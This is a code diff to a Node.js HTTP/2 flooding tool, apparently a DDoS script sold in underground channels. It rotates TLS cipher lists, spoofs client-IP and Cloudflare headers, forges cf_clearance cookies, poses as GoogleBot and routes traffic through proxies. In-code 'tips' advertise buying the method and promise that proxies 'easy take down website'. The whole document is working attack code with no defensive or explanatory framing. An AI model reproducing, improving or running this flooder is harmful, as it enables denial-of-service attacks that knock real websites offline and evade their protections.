@@ -99,58 +99,16 @@ process.on("unhandledRejection", errorHandler);
  ];
  const sigalgs1 = sig.join(':');
  const cplist = [
+  "ECDHE-RSA-AES128-GCM-SHA256",
+  "ECDHE-RSA-AES256-GCM-SHA384",
+  "ECDHE-ECDSA-AES256-GCM-SHA384",
+  "ECDHE-ECDSA-AES128-GCM-SHA256",
   "ECDHE-ECDSA-AES128-GCM-SHA256", 
   "ECDHE-ECDSA-CHACHA20-POLY1305", 
   "ECDHE-RSA-AES128-GCM-SHA256", 
   "ECDHE-RSA-CHACHA20-POLY1305", 
   "ECDHE-ECDSA-AES256-GCM-SHA384", 
-  "ECDHE-RSA-AES256-GCM-SHA384",
-  "ECDHE-RSA-AES128-GCM-SHA256",
-  "ECDHE-RSA-AES256-GCM-SHA384",
-  "ECDHE-ECDSA-AES256-GCM-SHA384",
-  "ECDHE-ECDSA-AES128-GCM-SHA256",
-'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
-'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
-'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
-'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
-"ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
-"ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
-"AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
-"EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
-"HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
-"ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
-'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
-'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
-'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
-'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
-'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
-'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
-'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
-'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
-'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
-'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
-"ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
-"ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
-"AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
-"EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
-"HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
-"ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
-'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
-'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
-'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
-'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
-'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
-'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
-'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
-'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
-':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
-'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
-'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
-'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
-"ECDHE-RSA-AES128-GCM-SHA256",
-"ECDHE-RSA-AES256-GCM-SHA384",
-"ECDHE-ECDSA-AES256-GCM-SHA384",
-"ECDHE-ECDSA-AES128-GCM-SHA256"
+  "ECDHE-RSA-AES256-GCM-SHA384"
  ];
  const accept_header = [
   "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
@@ -879,7 +837,9 @@ process.on("unhandledRejection", errorHandler);
     'Windows'
   ];
   methods = [
-  'GET'
+  'GET',
+  'GET',
+  'GET',
   ];
 
  version = [
@@ -943,8 +903,8 @@ const jalist = [
  "f15797a734d0b4f171a86fd35c9a5e43"
 ];
 const tips1 =[
- "MODIFY BY ANON_SEC_BD",
- "Buy Method? @anon_sec_bd",
+ "Gunakan Proxy Premium jangan proxy ampass",
+ "Buy Method? @mixc2",
  "Proxy high easy take down website",
 ];
 
@@ -992,21 +952,61 @@ const tips1 =[
  //var uar1 = uar[Math.floor(Math.floor(Math.random() * uar.length))];
  const parsedTarget = url.parse(args.target);
 
- const rateHeaders = [
-  { "akamai-origin-hop": randstr(5)  },
-  { "source-ip": randstr(5)  },
-  { "via": randstr(5)  },
-  { "cluster-ip": randstr(5)  },
+function generateRandomString(length) {
+  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  let result = '';
+  for (let i = 0; i < length; i++) {
+    result += characters.charAt(Math.floor(Math.random() * characters.length));
+  }
+  return result;
+}
+
+const rateHeaders = [
+  { "A-IM": "Feed" },
+  { "accept": accept },
+  { "accept-charset": accept },
+  { "accept-datetime": accept },
+  { "accept-encoding": encoding },
+  { "accept-language": lang },
+  { "upgrade-insecure-requests": "1" },
   { "Access-Control-Request-Method": "GET" },
-  { "dnt" : "1" }
-  ];
-  const rateHeaders2 = [
-  { "akamai-origin-hop": randstr(5)  },
-  { "source-ip": randstr(5)  },
-  { "via": randstr(5)  },
-  { "cluster-ip": randstr(5)  },
+  { "Cache-Control": "no-cache" },
+  { "Content-Encoding": "gzip, deflate, br" },
+  { "content-type": "text/html" },
+  { "cookie": randstr(15) },
+  { "Expect": "100-continue" },
+  { "Forwarded": "for=192.168.0.1;proto=http;by=" + spoofed },
+  { "From": "user@gmail.com" },
+  { "Max-Forwards": "10" },
+  { "origin": "https://" + parsedTarget.host },
+  { "pragma": "no-cache" },
+  { "referer": "https://" + parsedTarget.host + "/" },
+  { "CF-Connecting-IP": "192.168.0.1" }, 
+  { "CF-EW-Client-IP": "192.168.0.1" }, 
+  { "CF-Challenge-Response": generateRandomString(32) },
+  { "CF-Request-ID": generateRandomString(24) },
+  { "CF-Ray": "8ffb21657d88ee2f-CGK" },
+  { "CF-Visitor": '{"scheme":"https"}' },
+];
+
+const rateHeaders2 = [
+  { "Via": "1.1 " + parsedTarget.host },
+  { "X-Requested-With": "XMLHttpRequest" },
   { "X-Forwarded-For": spoofed },
-  ];
+  { "X-Vercel-Cache": randstr(15) },
+  { "Alt-Svc": "http/1.1=http2." + parsedTarget.host + "; ma=7200" },
+  { "TK": "?" },
+  { "X-Frame-Options": "deny" },
+  { "X-ASP-NET": randstr(25) },
+  { "Refresh": "5" },
+  { "X-Content-duration": spoofed },
+  { "service-worker-navigation-preload": Math.random() < 0.5 ? 'true' : 'null' },
+  { "CF-Connecting-IP": "192.168.0.1" }, 
+  { "CF-EW-Client-IP": "192.168.0.1" }, 
+  { "CF-Challenge-Response": generateRandomString(32) },
+  { "CF-Request-ID": generateRandomString(24) },
+  { "CF-Visitor": '{"scheme":"https"}' }, 
+];
 
 
  if (cluster.isMaster) {
@@ -1068,180 +1068,119 @@ const tips1 =[
  }
 var hd={}
  const Socker = new NetSocket();
- headers[":method"] = "GET";
- headers[":authority"] = parsedTarget.host;
- headers["x-forwarded-proto"] = "https";
- headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
- headers[":scheme"] = "https";
- headers[":path"] = parsedTarget.path
- headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(15);
- headers[":authority"] = parsedTarget.host;
- headers["origin"] = parsedTarget.host;
- headers["Via"] = fakeIP;
- headers["sss"] = fakeIP;
- headers["Sec-Websocket-Key"] = fakeIP;
- headers["Sec-Websocket-Version"] = 13;
- headers["Upgrade"] = websocket;
- headers["X-Forwarded-For"] = fakeIP;
- headers["X-Forwarded-Host"] = fakeIP;
- headers["Client-IP"] = fakeIP;
- headers["Real-IP"] = fakeIP;
- headers["Referer"] = randomReferer;
- headers["User-Agent"] = randomHeaders['User-Agent'];
- headers["user-agent"] = uap;
- headers["User-Agent"] = uap;
- headers["CF-Connecting-IP"] = fakeIP;
- headers["CF-RAY"] = "randomRayValue";
- headers["CF-Visitor"] = "{'scheme':'https'}";
- headers["X-Forwarded-For"] = spoofed
- headers["X-Forwarded-For"] = spoofed
- headers["X-Forwarded-For"] = spoofed
- headers[":authority"] = parsedTarget.host;
- //headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
- headers[":scheme"] = "https";
- headers["x-forwarded-proto"] = "https";
- headers["cache-control"] = "no-cache";
- headers["X-Forwarded-For"] = spoofed;
- headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
- headers["sec-ch-ua-mobile"] = "?0";
- headers["sec-ch-ua-platform"] = "Windows";
+headers[":method"] = "GET";
+headers[":authority"] = parsedTarget.host;
+headers["x-forwarded-proto"] = "https";
+headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
+headers[":scheme"] = "https";
+headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
+headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
+headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(15);
+headers[":authority"] = parsedTarget.host;
+headers["origin"] = "https://huntervm.click";
+headers["Content-Type"] = randomHeaders['Content-Type'];
+headers[":scheme"] = "https";
+headers["x-download-options"] = randomHeaders['x-download-options'];
+headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
+headers["X-Forwarded-For"] = spoofed;
+headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
+headers["accept"] = randomHeaders['accept'];
+headers["accept"] = randomHeaders['accept'];
+headers["accept"] = accept;
+headers["accept-language"] = randomHeaders['accept-language'];
+headers["accept-language"] = lang;
+headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
+headers["referer"] = Ref;
+headers["x-cache"] = randomHeaders['x-cache'];
+headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
+headers["accept-encoding"] = randomHeaders['accept-encoding'];
+headers["accept-encoding"] = encoding;
+headers["cache-control"] = randomHeaders['cache-control'];
+headers["x-frame-options"] = randomHeaders['x-frame-options'];
+headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
+headers["x-content-type-options"] = "nosniff";
+headers["X-Forwarded-For"] = spoofed;
+headers["TE"] = "trailers";
+headers["pragma"] = randomHeaders['pragma'];
+headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
+headers["upgrade-insecure-requests"] = "1";
+headers["sec-fetch-dest"] = randomHeaders['sec-fetch-dest'];
+headers["sec-fetch-mode"] = randomHeaders['sec-fetch-mode'];
+headers["sec-fetch-site"] = randomHeaders['sec-fetch-site'];
+headers["X-Forwarded-Proto"] = HTTPS;
+headers["sec-ch-ua"] = randomHeaders['sec-ch-ua'];
+headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'];
+headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
+headers["sec-ch-ua-mobile"] = "?0";
+ headers["sec-ch-ua-platform"] = pl;
  headers["accept-language"] = lang;
  headers["accept-encoding"] = encoding;
  headers["upgrade-insecure-requests"] = "1";
- headers["accept"] = accept;
- headers["user-agent"] = moz + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
- headers["referer"] = Ref;
- headers["sec-fetch-mode"] = "navigate"; 
- headers["sec-fetch-dest"] = dest1;
- headers["sec-fetch-user"] = "?1";
- headers["TE"] = "trailers";
- headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
- headers["sec-fetch-site"] = site1;
- headers["x-requested-with"] = "XMLHttpRequest";
- headers.GET = ' / HTTP/2';
- headers[':path'] = parsedTarget.path;
- headers[':scheme'] = 'https';
- headers.Referer = 'https://google.com';
- headers.accept_header = xn;
- headers['accept-language'] = badag;
- headers['accept-encoding'] = enc; 
- headers.Connection = 'keep-alive';
- headers['upgrade-insecure-requests'] = '1';
- headers.TE = 'trailers';
- headers['x-requested-with'] = 'XMLHttpRequest';
- headers['Max-Forwards'] = '10';
- headers.pragma = 'no-cache';
- headers.Cookie = 'cf_clearance=mOvsqA7JGiSddvLfrKvg0VQ4ARYRoOK9qmQZ7xTjC9g-1698947194-0-1-67ed94c7.1e69758c.36e830ad-250.2.1698947194'; 
- headers["Real-IP"] = spoofed;
- headers["referer"] = Ref;
- headers[":authority"] = parsedTarget.host + ":80"; // Include port 80 in :authority header
- headers["origin"] = "https://" + parsedTarget.host + ":80"; // Include port 80 in origin header
- headers["Via"] = "1.1 " + parsedTarget.host + ":80"; // Include port 80 in Via header
- headers[":authority"] = parsedTarget.host + ":443"; // Include port 80 in :authority header
- headers["origin"] = "https://" + parsedTarget.host + ":443"; // Include port 80 in origin header
- headers["Via"] = "1.1 " + parsedTarget.host + ":443"; // Include port 80 in Via header
- headers.push({ "Alt-Svc": "http/1.1=" + parsedTarget.host + "; ma=7200" }); // Add the http/1.1 header
- headers.push({ "Alt-Svc": "http/1.2=" + parsedTarget.host + "; ma=7200" }); // Add the http/1.2 header
- headers.push({ "Alt-Svc": "http/2=" + parsedTarget.host + "; ma=7200" });   // Add the http/2 header 
- headers.push({ "Alt-Svc": "http/1.1=http2." + parsedTarget.host + ":80; ma=7200" }); // Add the http/1.1 header with port 80
- headers.push({ "Alt-Svc": "http/1.2=http2." + parsedTarget.host + ":80; ma=7200" }); // Add the http/1.2 header with port 80
- headers.push({ "Alt-Svc": "http/2=http2." + parsedTarget.host + ":80; ma=7200" });   // Add the http/2 header with port 80
- headers.push({ "Alt-Svc": "http/1.1=" + parsedTarget.host + ":443; ma=7200" });      // Add the http/1.1 header with port 443
- headers.push({ "Alt-Svc": "http/1.2=" + parsedTarget.host + ":443; ma=7200" });      // Add the http/1.2 header with port 443
- headers.push({ "Alt-Svc": "http/2=" + parsedTarget.host + ":443; ma=7200" });
- headers.push({ "Alt-Svc": "http/3=" + parsedTarget.host + ":443; ma=86400" });
- headers.push({ "Alt-Svc": "h3=" + parsedTarget.host + ":443; ma=86400" });        // Add the http/2 header with port 443  
- headers[":authority"] = parsedTarget.host;
- //headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
- headers[":scheme"] = "https";
- headers["x-forwarded-proto"] = "https";
- headers["cache-control"] = "no-cache";
- headers["X-Forwarded-For"] = spoofed;
- headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
- headers["sec-ch-ua-mobile"] = "?0";
- headers["sec-ch-ua-platform"] = "Windows";
- headers["accept-language"] = lang; 
- headers["accept-encoding"] = encoding;
- headers["upgrade-insecure-requests"] = "1"; 
- headers["accept"] = accept;
- headers["user-agent"] = moz + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
- headers["referer"] = Ref;
- headers["sec-fetch-mode"] = "navigate";
- headers["sec-fetch-dest"] = dest1;
- headers["sec-fetch-user"] = "?1";
- headers["TE"] = "trailers";
- headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
- headers["sec-fetch-site"] = site1;
- headers["x-requested-with"] = "XMLHttpRequest";
- headers["cf-cache-status"] = "BYPASS";
- headers["cf-cache-status"] = "DYNAMIC";
- const rateHeaders3 = [
-  { "A-IM": "Feed" },
-  { "accept": accept },
-  { "accept-charset": accept },
-  { "accept-datetime": accept },
-  { "accept-encoding": encoding },
-  { "accept-language": lang },
-  { "upgrade-insecure-requests": "1" },
-  { "Access-Control-Request-Method": "GET" },
-  { "Cache-Control": "no-cache" },
-  { "Content-Encoding": "gzip, deflate, br" },
-  { "content-type": "text/html" },
-  { "cookie": randstr(15) },
-  { "Expect": "100-continue" },
-  { "Forwarded": "for=192.168.0.1;proto=http;by=" + spoofed },
-  { "From": "user@gmail.com" },
-  { "Max-Forwards": "10" },
-  { "origin": "https://" + parsedTarget.host },
-  { "pragma": "no-cache" },
-  { "referer": "https://" + parsedTarget.host + "/" },
-  { "CF-Connecting-IP": "192.168.0.1" }, 
-  { "CF-EW-Client-IP": "192.168.0.1" }, 
-  { "CF-Challenge-Response": generateRandomString(32) },
-  { "CF-Request-ID": generateRandomString(24) },
-  { "CF-Ray": "8ffb21657d88ee2f-CGK" },
-  { "CF-Ratelimit-Remaining": "X" }, 
-  { "CF-Ratelimit-Limit": "Y" }, 
-];
-
-const rateHeaders4 = [
-  { "Via": "1.1 " + parsedTarget.host },
-  { "X-Requested-With": "XMLHttpRequest" },
-  { "X-Forwarded-For": spoofed },
-  { "X-Vercel-Cache": randstr(15) },
-  { "Alt-Svc": "http/1.1=http2." + parsedTarget.host + "; ma=7200" },
-  { "Alt-Svc": "http/2=http3" + parsedTarget.host + "; ma=86400" },
-  { "TK": "?" },
-  { "X-Frame-Options": "deny" },
-  { "X-ASP-NET": randstr(25) },
-  { "Refresh": "5" },
-  { "X-Content-duration": spoofed },
-  { "service-worker-navigation-preload": Math.random() < 0.5 ? 'true' : 'null' },
-  { "CF-Connecting-IP": "192.168.0.1" }, 
-  { "CF-EW-Client-IP": "192.168.0.1" }, 
-  { "CF-Challenge-Response": generateRandomString(32) },
-  { "CF-Request-ID": generateRandomString(24) },
-  { "CF-WAF-Action": "Manage challenge" },
-  { "CF-Ratelimit-Remaining": "X" }, 
-  { "CF-Ratelimit-Limit": "Y" }, 
-];
+headers["vary"] = randomHeaders['vary'];
+headers["x-requested-with"] = "XMLHttpRequest";
+headers["TE"] = trailers;
+headers["set-cookie"] = randomHeaders['set-cookie'];
+headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15)
+headers["Server"] = randomHeaders['Server'];
+headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
+headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
+headers["access-control-allow-origin"] = randomHeaders['access-control-allow-origin'];
+headers["Content-Encoding"] = randomHeaders['Content-Encoding'];
+headers["alt-svc"] = randomHeaders['alt-svc'];
+headers["Via"] = fakeIP;
+headers["sss"] = fakeIP;
+headers["Sec-Websocket-Key"] = fakeIP;
+headers["Sec-Websocket-Version"] = 13;
+headers["Upgrade"] = websocket;
+headers["X-Forwarded-For"] = fakeIP;
+headers["X-Forwarded-Host"] = fakeIP;
+headers["Client-IP"] = fakeIP;
+headers["Real-IP"] = fakeIP;
+headers["Referer"] = randomReferer;
+headers["User-Agent"] = randomHeaders['User-Agent'];
+headers["user-agent"] = uap;
+headers["User-Agent"] = uap;
+headers["CF-Connecting-IP"] = fakeIP;
+headers["CF-RAY"] = "randomRayValue";
+headers["CF-Visitor"] = "{'scheme':'https'}";
+headers["X-Forwarded-For"] = spoofed
+headers["X-Forwarded-For"] = spoofed
+headers["X-Forwarded-For"] = spoofed
+headers[":authority"] = parsedTarget.host;
+//headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
+headers[":scheme"] = "https";
+headers["x-forwarded-proto"] = "https";
+headers["cache-control"] = "no-cache";
+headers["X-Forwarded-For"] = spoofed;
+headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
+headers["sec-ch-ua-mobile"] = "?0";
+headers["sec-ch-ua-platform"] = "Windows";
+headers["accept-language"] = lang;
+headers["accept-encoding"] = encoding;
+headers["upgrade-insecure-requests"] = "1";
+headers["accept"] = accept;
+headers["user-agent"] = moz + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
+headers["referer"] = Ref;
+headers["sec-fetch-mode"] = "navigate"; 
+headers["sec-fetch-dest"] = dest1;
+headers["sec-fetch-user"] = "?1";
+headers["TE"] = "trailers";
+headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
+headers["sec-fetch-site"] = site1;
+headers["x-requested-with"] = "XMLHttpRequest";
+headers["cf-cache-status"] = "BYPASS";
+headers["cf-cache-status"] = "DYNAMIC";
+ 
  function runFlooder() {
      const proxyAddr = randomElement(proxies);
      const parsedProxy = proxyAddr.split(":");
          headers["origin"] = "https://" + parsedTarget.host;
